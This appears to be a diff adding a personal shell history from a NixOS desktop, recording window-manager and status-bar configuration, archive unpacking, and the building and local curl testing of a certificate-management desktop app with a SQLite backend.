+sudo hx .
+sudo nixos-rebuild switch --upgrade
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+sudo hx .
+cd ~/.monad
+ls
+cd /etc/nixos
+sudo nixos-rebuild switch --upgrade
+mv ~/.monad/xmonad.hs ./
+sudo mv ~/.monad/xmonad.hs .
+ls
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+hx .
+sudo nixos-rebuild switch --upgrade
+hx .
+sudo nixos-rebuild switch --upgrade
+hx .
+sudo nixos-rebuild switch --upgrade
+hx .
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+reboot
+cd /etc/nixos
+sudo hx .
+zmonad
+xmonad
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+xmonad
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+reboot
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+sudo hx .
+reboot
+cd /etc/nixos
+ls
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+reboot
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+reboot
+cd /etc/nixos
+sudo hx .
+cd ~
+ls
+cd ~/.config
+ls
+cd xmonad/
+ls
+thuanr .
+thunar .
+hx xmonad.hs
+helix
+cd /etc/nixos
+sudo nixos-rebuild switch --upgrade
+reboot
+cd ~?.config
+cd ~/.config
+cd xmonad/
+ls
+hx .
+cd ..
+ls
+xmobar
+mkdir xmobar
+hx xmobarrc
+reboot
+cd ~/.
+cd ~/.config/
+cd xmonad/
+ls
+hx .
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+reboot
+cd ~?
+cd ~/.config/
+cd xmonad/
+ls
+hx .
+reboot
+cd ./~config/xmonad
+cd ~/.config/xmonad
+hx .
+rofi
+demnu
+dmenu
+dmenu_run
+rofi 
+rofi -show window
+rofi -show run
+hx .
+cd ~/.config/xmonad
+hx .
+cd ~/.config/xmonad
+neofetch
+pfetch
+xmobar
+cd ~/.config/xmobar
+ls
+xmobar -B white -a right -F blue -t '%LIPB%' -c '[Run Weather "LIPB" [] 36000]'
+xmobar.hs
+hx xmobar.hs
+xmobar -B white -a right -F blue -t '%LIPB%' -c '[Run Weather "LIPB" [] 36000]'
+xmobar 
+hx xmobar.hs
+xmobar 
+ls
+hx xmobar.hs
+xmobar 
+hx xmobar.hs
+xmobar 
+cd projects/clones
+git clone https://github.com/lifer0se/dotfiles.git
+thunar .
+hx xmobar.hs
+cd ~/.config/xmobar
+xmobar 
+cd dotfiles/
+ls
+thunar .
+cd .config/xmonad
+hx .
+ls
+mv xmobar ~/.config/xmonad
+cd ..
+ls
+hx xmobarrc
+cd xmonad/
+ls
+hx .
+cd ~/.config/xmonad
+hx .
+drun
+cd ~/.config/xmonad
+xmobar 
+cd ~/.config/xmonad
+hx .
+i3bar
+i3gaps
+i3bar
+cd ~/.config/xmonad
+hx .
+reboot
+pfetch
+hx .
+cd ~/.config
+ls
+mv xmobarrc ./xmobar
+cd xmobar/
+ls
+xmobar
+cd ~/.config/xmo
+cd ~/.config/xmonad/
+ls
+hx .
+ls
+cd xmobar
+ls
+hx ~/.xmobarrc
+xmobar &
+ls
+cd ..
+hx .
+cd /usr/share
+cd /share
+sudo find / -iname xmobar
+cd /home/chikoyeat/.local/share/xmobar
+ls
+sudo find / -iname xmobar
+xmobar ~/.xmobarrc &
+xmobar -B white -a right -F blue -t '%LIPB%' -c '[Run Weather "LIPB" [] 36000]' &<\n>
+cd ~/.config/xmobar
+ls
+hx .
+xmobar -B white -a right -F blue -t '%LIPB%' -c '[Run Weather "LIPB" [] 36000]'
+ls
+rm -rf xmobar.hs
+xmobar -B white -a right -F blue -t '%LIPB%' -c '[Run Weather "LIPB" [] 36000]'
+xmobar
+hx .
+fc-list | grep "Bitstream Vera Sans Mono"
+hx .
+fc-list | grep "Bitstream Vera Sans Mono"
+xmobar
+hx .
+xmobar
+xmobar help
+xmobar -help
+xmobar -n
+xmobar -name
+xmobar -t 
+xmobar -t template
+xmobar --template=template
+xmobar -c
+xmobar -c commands
+xmobar -r
+xmobar -w class 
+xmobar -i path  
+xmobar -f font name
+cd ..
+cd xmonad
+ls
+cd ~/config
+cd ~/.config
+ls
+hx .
+hx ~/.xmobarrc
+hx .
+cd projects/clones
+ls
+cd dotfiles/
+ls
+cd .config
+cd xmonad/
+ks
+ls
+cd projects/clones/
+ls
+cd dotfiles/xmonad
+cd dotfiles/
+ls
+cd .config/dotfiles/xmonad
+cd .config/xmonad
+ls
+tim
+clear
+time
+cd /etc/nixos
+date
+date now
+date
+date nwo
+date now
+cd ~/.config/nu
+cd ~/.config/nushell/
+hx .
+time
+vi
+time
+cd ~/.config/nushell/
+date
+time
+date
+time
+hx .
+time
+kitty
+neofetch
+pfetch
+kitty
+cd ..
+ls
+# We use Alacritty's default Linux config directory as our storage location here.<\n>mkdir -p ~/.config/alacritty/themes<\n>git clone https://github.com/alacritty/alacritty-theme ~/.config/alacritty/themes
+mkdir -p ~/.config/alacritty/themes<\n>git clone https://github.com/alacritty/alacritty-theme ~/.config/alacritty/themes
+git clone https://github.com/alacritty/alacritty-theme ~/.config/alacritty/themes
+time
+cd alacritty/
+cd themes/
+ls
+cd ..
+ls
+thunar .
+ls
+cd alacritty/
+ls
+cd themes/
+ls
+git clone https://github.com/alacritty/alacritty-theme ~/.config/alacritty/themes
+cd ~/projects/clones
+git clone https://github.com/alacritty/alacritty-theme ~/.config/alacritty/themes
+git clone https://github.com/alacritty/alacritty-theme
+cd ~/.config/alacritty/
+cd themes/
+ls
+hx .
+ls
+hx alacritty.tml
+hx alacritty.toml
+kitty
+tim
+time
+man vhdl
+vhdl
+man ghdl
+man x
+man c
+man cpp
+man gcc
+man clang
+man libc
+man C
+cd ~/.config/xmonad/
+hxx .
+pfetch
+cd ~/.config/xmonad/
+hx .
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+sudo hx .
+flatpak upgrade
+cd ~/.config/xmonad/
+xclip
+# Define a variable for the screenshot directory and file name format<\n>set $screenshot_dir /home/$USER/Pictures<\n>set $screenshot_format png<\n>set $screenshot_date $(date -u +'%Y%m%d-%H%M%SZ')<\n># Screenshot commands for clipboard<\n>exec --no-startup-id maim --format=$screenshot_format | xclip -selection clipboard -t image/$screenshot_format<\n>exec --no-startup-id maim --format=$screenshot_format --window $(xdotool getactivewindow) | xclip -selection clipboard -t image/$screenshot_format<\n>exec --no-startup-id maim --format=$screenshot_format --select | xclip -selection clipboard -t image/$screenshot_format<\n># Bindings for screenshots in clipboard<\n>bindsym Ctrl+$super+Print exec --no-startup-id maim --format=$screenshot_format --window $(xdotool getactivewindow) | xclip -selection clipboard -t image/$screenshot_format<\n>bindsym Ctrl+Shift+S exec --no-startup-id maim --format=$screenshot_format --select | xclip -selection clipboard -t image/$screenshot_format
+xclip -selection clipboard -t image/$screenshot_format
+scrot
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+scrot
+sudo scrot
+sudo scrot help
+scrot -s
+scrot - | xclip -selection clipboard -target image/png
+scrot -s | xclip -selection clipboard -target image/png
+nmcli device wifi connect "hmm"
+nmcli device wifi
+nmcli device wifi connect "hmm"
+amixer
+cd ~/.config/xmonad/
+hx .
+sct 8000
+sct 0
+sct 8000
+sct 0
+sct 8000
+hx .
+cd projects/ghdl-circuits/
+mkdir practice
+cd practice
+hx ha.hx
+time
+cd projects/ghdl-circuits/
+cd basics/
+cd projects/ghdl-circuits/
+cd basics/
+cd projects/ghdl-circuits/
+time
+xscreensaver-command -lock
+xscreensaver -lock
+xscreensaver -help
+xscreensaver -h
+xscreensaver
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+i3lock -i ~/.lock.png
+xscreensaver
+xscreensaver-command -lock
+xscreensaver
+xscreensaver-command -lock
+σλοψκ
+λλλλλllllλlλllllllllλλλλλλλλλλlllllllllllλλλλλλλλλΛΛΛΛλλΛΛΛλλλΛΛΛΛΛΛλΛλλλνξκξκνννλλλλλλλΛΛΛΛΛΛΛΛΛΛΛΛΛΛΛΛΛΛΛΛΞΝΒΒΩΓvvvvηκjklnkanjkbad
+flatpak upgrade
+flatpak list
+cd /etc/nixos
+sudo nixos-rebuild switch --upgrade
+sudo nix-channel --update
+sudo nixos-rebuild switch --update
+sudo nix-channel --list
+sudo nix-channel --update<\n>
+sudo nixos-rebuild switch
+nix-env -u '*'
+sudo nixos-rebuild switch
+sudo hx .
+sudo nixos-rebuild switch
+sudo hx .
+sudo nixos-rebuild switch
+sudo hx .
+sudo nixos-rebuild switch
+sudo hx .
+sudo nixos-rebuild switch
+sudo hx .
+sudo nixos-rebuild switch
+sudo hx .
+sudo nixos-rebuild switch
+sudo hx .
+sudo nixos-rebuild switch
+sudo hx .
+sudo nixos-rebuild switch
+sudo hx .
+ls
+hx .
+rm -rf xmonad.hs
+sudo rm -rf xmonad.hs
+sudo rm -rf 2024-12-04-233858_1920x1080_scrot.png
+ls
+hx .
+rm -rf help
+sudo rm -rf help
+hx .
+time
+hx .
+cd projects
+mkdir freelancing
+cd freelancing
+mkdir secure-app
+cd secure-app/
+ls
+xmobar ~/.xmobarrc &
+xmobar ~/.xmobarrc 
+cd ~/.
+ls
+hx .xmobarrc
+xmobar .xmobarrc &
+xmobar .xmobarrc
+hx .xmobarrc
+xmobar .xmobarrc
+hx .xmobarrc
+cd /etc/nixos
+hx .
+hx .xmobarrc
+cd ~/.
+hx .xmobarrc
+xmobar .xmobarrc
+hx .xmobarrc
+xmobar .xmobarrc
+xmobar -h
+xmobar -v
+xmobar -V
+sudo hx .
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch
+xmobar .xmobarrc
+xmobar -V
+xmobar .xmobarrc
+xmobar ~/.config/xmonad
+cd ~/.config/xmonad/
+ls
+cd xmobar
+xmobar .xmobarrc
+ls
+xmobar 
+xmobar
+xmobar -h
+xmobar -r
+xmobar -t
+xmobar -t template
+hx .xmobarrc
+xmobar .xmobarrc
+xmobar .xmobarrc &
+cd ~/.config/xmonad/
+hx .
+xmobar -x
+xmobar -t "CPU: %cpu% | MEM: %memory%"<\n>
+hx .
+cd ..
+hx .xmobarrc
+xmobar .xmobarrc &
+xmobar .xmobarrc 
+fc-list | grep -i "font-name"<\n>
+fc-list | grep -i "font-name"
+xmobar -t "CPU: %cpu% | MEM: %memory%"<\n>
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch
+sudo hx .
+sudo nixos-rebuild switch
+cd ..
+cd ~
+xmobar -t "CPU: %cpu% | MEM: %memory%"<\n>
+xmobar .xmobarrc 
+hx .xmobarrc
+xmobar .xmobarrc 
+xmobar -x .xmobarrc
+xmobar -x 0 .xmobarrc
+hx .xmobarrc
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch
+cd ~/.
+xmobar -x 0 .xmobarrc
+hx .xmobarrc
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch
+sudo hx .
+sudo nixos-rebuild switch
+sudo hx .
+sudo nixos-rebuild switch
+fc-list | grep 'Ubuntu'
+fc-list 
+fc-list | grep 'Ubuntu Sans'
+fc-list | grep 'Ubuntu-sans'
+fc-list | grep 'ubuntu-sans'
+cd ~/.
+hx .xmobarrc
+xmobar -x 0 .xmobarrc
+hx .xmobarrc
+xmobar -x 0 .xmobarrc
+fc-list | grep 'ubuntu-sans'
+fc-list 
+cd projects/freelancing/
+ls
+rm -rf secure-app/
+time
+npx create-next-app@latest tauri-secure-app<\n>cd tauri-secure-app<\n>npm install @tauri-apps/api @tauri-apps/cli<\n>npm install electron-store crypto<\n>npm install shadcn/ui<\n>npx shadcn-ui@latest init
+tauri
+tauricli
+cd /etc/nixos
+hx .
+cargo-tauri
+npm create next-app@latest my-desktop-app<\n>cd my-desktop-app<\n>npm install @tauri-apps/api bcryptjs<\n>npm install -D @types/bcryptjs
+cd ~/projects/freelancing/
+ls
+npm create next-app@latest my-desktop-app<\n>cd my-desktop-app<\n>npm install @tauri-apps/api bcryptjs<\n>npm install -D @types/bcryptjs
+ls
+cargo-tauri
+cargo-tauri dev
+cargo-tauri build
+npm install -D @tauri-apps/cli<\n>npx tauri init
+cargo-tauri build
+cargo-tauri dev
+npm run dev
+ls
+cd src-tauri/
+ls
+cargo-tauri dev
+cargo-tauri build
+cargo-tauri dev
+hx .
+cd ..
+ls
+hx .
+cargo-tauri dev
+cargo-tauri build
+cd projects/
+rm -rf freelancing
+mkdir freelance
+cd freelance
+ls
+npx create-next-app@latest my-local-dashboard<\n>cd my-local-dashboard<\n>npx shadcn-ui@latest init<\n>npx shadcn-ui@latest add button dialog dropdown-menu switch
+zen .
+zed .
+zed-editor .
+zeditorr .
+zeditor .
+deno run dev
+npx shadcn-ui@latest init
+npx shadcn-ui@latest add button<\n>npx shadcn-ui@latest add dialog<\n>npx shadcn-ui@latest add dropdown-menu<\n>npx shadcn-ui@latest add switch
+npm install -g shadcn-ui
+npx @shadcn/ui@latest init
+# Install required dependencies<\n>npm install tailwind-merge clsx class-variance-authority @radix-ui/react-slot @radix-ui/react-dialog @radix-ui/react-dropdown-menu @radix-ui/react-switch lucide-react<\n><\n># Install Tailwind CSS and its peer dependencies<\n>npm install -D tailwindcss postcss autoprefixer<\n><\n># Initialize Tailwind<\n>npx tailwindcss init -p
+deno run dev
+npx shadcn@latest add button<\n>
+deno run dev
+npx shadcn@latest add dialog<\n>
+deno run dev
+npx shadcn@latest add dropdown-menu<\n>
+deno run dev
+npm install
+npm install clsx tailwind-merge @radix-ui/react-dropdown-menu @radix-ui/react-dialog @radix-ui/react-switch lucide-react<\n>npm install -D tailwindcss postcss autoprefixer tailwindcss-animate
+npm run dev
+npx shadcn@latest add switch<\n>
+npm run dev
+cargo install tauri-cli --version "^1.0.0"
+cargo tauri init
+cargo tauri dev
+cd /etc/nixos
+ls
+sudo hx .
+sudo nixos-rebuild switch
+sudo hx .
+sudo nixos-rebuild switch
+cargo-tauri build
+cargo-tauri dev
+nix develop
+deno run dev
+npm run dev
+npm install --save-dev electron electron-builder concurrently
+npm install electron-serve
+cargo-tauri init
+cargo-tauri build
+cargo-tauri dev
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch
+cargo-tauri dev
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch
+sudo hx .
+cargo-tauri dev
+sudo nixos-rebuild switch
+cargo-tauri dev
+sudo hx .
+sudo nixos-rebuild switch
+sudo hx .
+cargo-tauri dev
+sudo nixos-rebuild switch
+sudo hx .
+sudo nixos-rebuild switch
+cargo-tauri dev
+sudo hx .
+sudo nixos-rebuild switch
+sudo hx .
+cargo-tauri dev
+sudo nixos-rebuild switch
+acpi
+cd ~/.config/nushell/
+ls
+hx .
+batt
+source nu
+batt
+neofetch
+batt
+sct 4000
+deno run dev
+npm run dev
+git add .
+git commit -m dot
+git push
+time
+batt
+deno run dev
+npm run dev
+git add .
+git commit -m lfg
+git push
+deno run dev
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch
+cd ~/Videos
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch
+flatpak install flathub org.gimp.GIMP
+ls
+flatpak uninstall flathub org.gimp.GIMP
+cd Dow
+cd Downloads/
+unzip `REALISTIC BLACK TEE by CONSENTIDA.zip`
+thunar .
+cd subhasha/
+unzip .
+unzip all
+unzip \*.zip
+unzip *.zip
+unzip /*.zip
+ls
+unzip `Acid Film Backgrounds and Textures.rar`
+unzip `REALISTIC BLACK TEE by CONSENTIDA.zip`
+unzip `REALISTIC GREY HOODIE by CONSENTIDA.zip`
+unzip `Acid Film Backgrounds and Textures.rar`
+unzip `FREE graphic pack-3_by DesignFamilyMarket.VdXJWld9.rar.part`
+thunar .
+unzip `FREE graphic pack-3_by DesignFamilyMarket.VdXJWld9.rar`
+thunar .
+unzip `Free_pack_abstract_tribal_geometric by Hainz Studio.zip`
+thunar .
+unzip `Free_pack_abstract_tribal_geometric by Hainz Studio.jpg`
+unzip `Free Pack - Abstract Tribal Geometric.rar`
+nmcli device wifi connect "hmm"
+nmcli device wifi
+nmcli device wifi connect "hmm"
+thunar .
+unzip `-psycho- displacement kit.7z`
+unzip -d `-psycho- displacement kit.7z`
+unzip `-psycho- displacement kit.7z` -d 
+mkdir photo
+unzip `-psycho- displacement kit.7z` -d photo
+unzip -d `-psycho- displacement kit.7z` photo
+unzip -d photo `-psycho- displacement kit.7z`
+7z
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch
+cd Downloads/subhasha
+cd ~/Downloads/subhasha
+p7z
+p7zip
+7z
+7z x "-psycho- displacement kit.7z" -pBC0A95C7-E0E24637-967134DA-D60B9A5F -o./photo<\n>
+7z x "-psycho- displacement kit.7z"
+7z x `-psycho- displacement kit.7z`
+7z x `-psycho- displacement kit.7z` BC0A95C7-E0E24637-967134DA-D60B9A5F
+7z x `Acid Film Backgrounds and Textures.rar`
+cd /etc/nixos
+sudo hx .
+xarchiver
+sudo nixos-rebuild switch
+xarchiver
+xarchiver .
+xarchiver 
+thunar .
+deno run dev
+cargo-tauri dev
+cd ~/projects/freelancing/
+cd ~/projects/freelance
+ls
+cd my-local-dashboard/
+ls
+npm run build
+deno run build
+bun
+cargo-tauri dev
+bun run dev
+cd ~/projects/freelance
+ls
+git clone https://github.com/chiqorein/certiapp.git
+cd certiapp
+ls
+deno install
+ls
+deno run dev
+cargo-tauri dev
+cd ~/projects/freelance/certiapp/
+ρεβοοτ
+reboot
+cd ~/projects/freelance/certiapp/
+flatpak up
+flatpak upgrade
+batt
+deno run dev
+cargo-tauri dev
+cd ~/projects/freelance/certiapp/
+batt
+ani-cli 
+batt
+cd ~/projects/freelance/certiapp/
+hx .
+nmcli
+nmcli device wifi
+nmcli device wifi connect "hmm"
+batt
+flathub upgrade
+flatpak upgrade
+pfetch
+batt
+npx shadcn@latest add select<\n>
+deno run dev
+vsc .
+code .
+deno run dev
+git add .
+git commit -m lfg
+git push
+deno run dev
+batt
+npm install @prisma/client prisma axios date-fns jspdf<\n>npx prisma generate<\n>npx prisma migrate dev --name init
+deno run dev
+nix-shell
+cd ~/projects/freelance/certiapp/
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch
+batt
+cd ~/projects/freelance/certiapp/
+nix-shell
+npm i sonner
+npm fund
+deno install sonner
+deno install npm:sonner
+deno run dev
+npx prisma init --datasource-provider sqlite
+npx prisma generate
+prisma
+prisma init --datasource-provider sqlite
+prisma migrate dev --name init
+prisma generate
+tree
+prisma @prisma/client better-sqlite3 formidable uuid
+npm install -D @types/better-sqlite3 @types/formidable @types/uuid
+npm install prisma @prisma/client better-sqlite3<\n>npm install -D @types/better-sqlite3
+prisma init
+prisma migrate dev --name init
+deno run dev
+prisma migrate dev --name init
+npx ts-node prisma/seed.ts
+npm run db:studio
+npx ts-node prisma/seed.ts
+npm run db:studio
+deno run dev
+node server.js<\n>
+cd api
+node server.js<\n>
+npm i express
+node server.js<\n>
+npm i cors
+npm i body-parser
+node server.js<\n>
+npm i sqlite3
+deno run dev
+curl -X GET http://localhost:5000/api/certificates<\n>
+curl -X POST http://localhost:5000/api/certificates \<\n>-H "Content-Type: application/json" \<\n>-d '{<\n>  "name": "John Doe",<\n>  "relationInfo": "Son of Jane Doe",<\n>  "licenceNo": "DL12345",<\n>  "badgeNo": "B123",<\n>  "drivingVehicle": "Car",<\n>  "competency": "Advanced",<\n>  "trainingDuration": "6 months",<\n>  "startDate": "2024-01-01",<\n>  "endDate": "2024-06-30",<\n>  "grade": "A",<\n>  "validUpto": "2025-12-31",<\n>  "photo": "base64-encoded-photo-data",<\n>  "signature": "base64-encoded-signature-data"<\n>}'<\n>
+curl -X PUT http://localhost:5000/api/certificates \<\n>-H "Content-Type: application/json" \<\n>-d '{<\n>  "id": 1,<\n>  "name": "John Doe",<\n>  "relationInfo": "Son of Jane Doe",<\n>  "licenceNo": "DL12345",<\n>  "badgeNo": "B123",<\n>  "drivingVehicle": "Truck",<\n>  "competency": "Expert",<\n>  "trainingDuration": "1 year",<\n>  "startDate": "2023-01-01",<\n>  "endDate": "2023-12-31",<\n>  "grade": "A+",<\n>  "validUpto": "2025-12-31",<\n>  "photo": "updated-base64-photo",<\n>  "signature": "updated-base64-signature"<\n>}'<\n>
+curl -X DELETE "http://localhost:5000/api/certificates?id=1"<\n>
+curl -X POST http://localhost:5000/api/certificates -H "Content-Type: application/json" -d '{"name":"John Doe","relationInfo":"Son of Jane Doe","licenceNo":"DL12345","badgeNo":"B123","drivingVehicle":"Car","competency":"Advanced","trainingDuration":"6 months","startDate":"2024-01-01","endDate":"2024-06-30","grade":"A","validUpto":"2025-12-31","photo":"base64-photo-data","signature":"base64-signature-data"}'<\n>
+curl -X POST http://localhost:5000/api/certificates -H "Content-Type: application/json" -d '{"name":"John Doe","relationInfo":"Son of Jane Doe","licenceNo":"DL12345","badgeNo":"B123","drivingVehicle":"Car","competency":"Advanced","trainingDuration":"6 months","startDate":"2024-01-01","endDate":"2024-06-30","grade":"A","validUpto":"2025-12-31","photo":"base64-encoded-photo-data","signature":"base64-encoded-signature-data"}'<\n>
+node server.js<\n>
+sqlite3 certificates.db<\n>
+rm certificates.db<\n>
+sqlite3 certificates.db<\n>
+.tables<\n>
+sqlite3 certificates.db<\n>
+deno run dev
+curl -X POST http://localhost:5000/api/certificates -H "Content-Type: application/json" -d '{"name":"John Doe","relationInfo":"Son of Jane Doe","licenceNo":"DL12345"}'<\n>
+sqlite3 ./api/certificates.db<\n>
+curl -X GET http://localhost:5000/api/certificates<\n>
+deno run dev
+curl -X GET http://localhost:5000/api/certificates<\n>
+deno run dev
+curl -X GET http://localhost:5000/api/certificates<\n>
+node server.js<\n>
+npm i multer path
+deno run dev
+curl -X GET http://localhost:5000/api/certificates<\n>
+deno run dev
+curl -X GET http://localhost:5000/api/certificates<\n>
+curl -X POST http://localhost:5000/api/certificates -H "Content-Type: application/json" -d '{"name":"John Doe","relationInfo":"Son of Jane Doe","licenceNo":"DL12345"}'<\n>
+curl -X POST http://localhost:5000/api/certificates/2 -H "Content-Type: application/json" -d '{"name":"John Doe","relationInfo":"Son of Jane Doe","licenceNo":"DL12345"}'<\n>
+curl -X POST http://localhost:5000/api/certificates/:2 -H "Content-Type: application/json" -d '{"name":"John Doe","relationInfo":"Son of Jane Doe","licenceNo":"DL12345"}'<\n>
+curl -X POST http://localhost:5000/api/certificates \<\n>  -F "name=John Doe" \<\n>  -F "relationInfo=Father" \<\n>  -F "licenceNo=123456789" \<\n>  -F "badgeNo=987654321" \<\n>  -F "drivingVehicle=Car" \<\n>  -F "competency=High" \<\n>  -F "trainingDuration=2 weeks" \<\n>  -F "startDate=2024-01-01" \<\n>  -F "endDate=2024-01-15" \<\n>  -F "grade=A" \<\n>  -F "validUpto=2025-01-01" \<\n>  -F "registrationNo=REG-001" \<\n>  -F "certificateNo=CERT-001" \<\n>  -F "photo=@path/to/photo.jpg" \<\n>  -F "signature=@path/to/signature.png"<\n>
+curl -X POST http://localhost:5000/api/certificates -F "name=John Doe" -F "relationInfo=Father" -F "licenceNo=123456789" -F "badgeNo=987654321" -F "drivingVehicle=Car" -F "competency=High" -F "trainingDuration=2 weeks" -F "startDate=2024-01-01" -F "endDate=2024-01-15" -F "grade=A" -F "validUpto=2025-01-01" -F "registrationNo=REG-001" -F "certificateNo=CERT-001" -F "photo=@path/to/photo.jpg" -F "signature=@path/to/signature.png"<\n>
+node server.js<\n>
+deno run dev
+deno server.js
+bun server.js
+curl -X POST http://localhost:5000/api/certificates -F "name=John Doe" -F "licenceNo=LIC12345" -F "photo=@/path/to/photo.jpg" -F "signature=@/path/to/signature.jpg"
+curl -X POST http://localhost:5000/api/certificates -F "name=John Doe" -F "licenceNo=LIC12345" -F "photo=@/home/yourusername/photos/profile.jpg" -F "signature=@/home/yourusername/signatures/signature.png"
+node server.js<\n>
+curl -X POST http://localhost:5000/api/certificates -F "name=John Doe" -F "licenceNo=LIC12345" -F "photo=@/home/yourusername/photos/profile.jpg" -F "signature=@/home/yourusername/signatures/signature.png"
+curl -X POST http://localhost:5000/api/certificates -H "Content-Type: application/json" -d '{"name":"John Doe","relationInfo":"Employee","licenceNo":"LIC123","badgeNo":"BADGE456","drivingVehicle":"Car","competency":"Safety Training","trainingDuration":"6 Months","startDate":"2024-01-01","endDate":"2024-06-30","grade":"A","validUpto":"2025-01-01","registrationNo":"REG789","certificateNo":"CERT101"}'
+node server.js<\n>
+CREATE TABLE IF NOT EXISTS certificates (<\n>    id INTEGER PRIMARY KEY AUTOINCREMENT,<\n>    name TEXT NOT NULL,<\n>    relationInfo TEXT NOT NULL,<\n>    licenceNo TEXT NOT NULL,<\n>    badgeNo TEXT NOT NULL,<\n>    drivingVehicle TEXT,<\n>    competency TEXT,<\n>    trainingDuration TEXT,<\n>    startDate TEXT NOT NULL,<\n>    endDate TEXT NOT NULL,<\n>    grade TEXT NOT NULL,<\n>    validUpto TEXT NOT NULL,<\n>    photo BLOB,<\n>    signature BLOB<\n>);<\n>
+curl -X POST http://localhost:5000/api/certificates -H "Content-Type: application/json" -d '{"name":"John Doe","relationInfo":"Employee","licenceNo":"LIC123","badgeNo":"BADGE456","drivingVehicle":"Car","competency":"Safety Training","trainingDuration":"6 Months","startDate":"2024-01-01","endDate":"2024-06-30","grade":"A","validUpto":"2025-01-01"}'
+node server.js<\n>
+curl -X POST http://localhost:5000/api/certificates
+node server.js<\n>
+sqlite3 ./api/certificates.db<\n>
+-- Sample INSERT statements (you can modify these as needed)INSERT INTO certificates (    name,     relationInfo,     licenceNo,     badgeNo,     drivingVehicle,     competency,     trainingDuration,     startDate,     registrationNo,     endDate,     grade,     validUpto) VALUES (    'John Doe',    'Employee',    'LIC-12345',    'BADGE-6789',    'Forklift',    'Advanced Machinery Operation',    '6 Months',    '2024-01-15',    'REG-9876',    '2024-07-15',    'A',    '2025-01-15');-- Another sample entryINSERT INTO certificates (    name,     relationInfo,     licenceNo,     badgeNo,     drivingVehicle,     competency,     trainingDuration,     startDate,     registrationNo,     endDate,     grade,     validUpto) VALUES (    'Jane Smith',    'Contractor',    'LIC-54321',    'BADGE-4321',    'Crane',    'Heavy Equipment Handling',    '3 Months',    '2024-02-01',    'REG-5432',    '2024-05-01',    'B+',    '2024-11-01');-- Command to verify entriesSELECT * FROM certificates;
+sqlite3 ./api/certificates.db
+sqlite3 certificates.db
+node server.js<\n>
+sqlite3 certificates.db
+node server.js<\n>
+curl -X POST http://localhost:5000/api/certificates
+curl -X GET http://localhost:5000/api/certificates
+curl -X GET http://localhost:5000/api/certificates/export
+sqlite3 certificates.db
+sqlite3 certificates.db
+node server.js<\n>
+curl -X GET http://localhost:5000/api/certificates/export
+curl -X GET http://localhost:5000/api/certificates/
+sqlite3 ./api/certificates.db
+node server.js<\n>
+curl -X GET http://localhost:5000/api/certificates/
+sqlite3 ./api/certificates.db
+sqlite3 certificates.db "SELECT * FROM certificates;"
+sqlite3 ./api/certificates.db "SELECT * FROM certificates;"
+curl -X GET http://localhost:5000/api/certificates/
+node server.js<\n>
+npm install csv-writer<\n>
+curl -X GET http://localhost:5000/api/certificates/
+bun run dev
+deno run dev
+node server.js<\n>
+curl -X GET http://localhost:5000/api/certificates/
+deno run dev
+curl -X POST http://localhost:5000/api/certificates -H "Content-Type: application/json" -d '{<\n>  "name": "Alice Cooper",<\n>  "relationInfo": "Employee",<\n>  "licenceNo": "LIC-67890",<\n>  "badgeNo": "BADGE-9876",<\n>  "drivingVehicle": "Forklift",<\n>  "competency": "Advanced Machinery Operation",<\n>  "trainingDuration": "6 Months",<\n>  "startDate": "2024-01-15",<\n>  "endDate": "2024-07-15",<\n>  "grade": "A",<\n>  "validUpto": "2025-01-15"<\n>}'<\n>
+curl -X POST http://localhost:5000/api/certificates -H "Content-Type: application/json" -d '{"name":"Alice Cooper","relationInfo":"Employee","licenceNo":"LIC-67890","badgeNo":"BADGE-9876","drivingVehicle":"Forklift","competency":"Advanced Machinery Operation","trainingDuration":"6 Months","startDate":"2024-01-15","endDate":"2024-07-15","grade":"A","validUpto":"2025-01-15"}'<\n>
+node server.js<\n>
+sqlite3 ./api/certificates.db "SELECT * FROM certificates;"
+sqlite3 certificates.db "SELECT * FROM certificates;"
+flatpak install flathub io.dbeaver.DBeaverCommunity
+nmcli device wifi connect "hmm"
+nmcli device wifi
+nmcli device wifi connect "hmm"
+flatpak install flathub it.fabiodistasio.AntaresSQL
+curl -X POST http://localhost:5000/api/certificates -H "Content-Type: application/json" -d '{"name":"Alice Cooper","relationInfo":"Employee","licenceNo":"LIC-67890","badgeNo":"BADGE-9876","drivingVehicle":"Forklift","competency":"Advanced Machinery Operation","trainingDuration":"6 Months","startDate":"2024-01-15","endDate":"2024-07-15","grade":"A","validUpto":"2025-01-15"}'<\n>
+sqlite3 ./api/certificates.db "SELECT * FROM certificates;"
+sqlite3 ./api/certificates.db
+sqlite3 ./api/certificates.db "SELECT * FROM certificates;"
+nmcli device wifi connect "hmm"
+ani-cli 
+nmcli device wifi connect "hmm"
+nmcli device wifi 
+nmcli device wifi connect "hmm"
+ani-cli 
+"" | sha256sum
+\ | sha256sum
+'' | sha256sum
+() | sha256sum
+{} | sha256sum
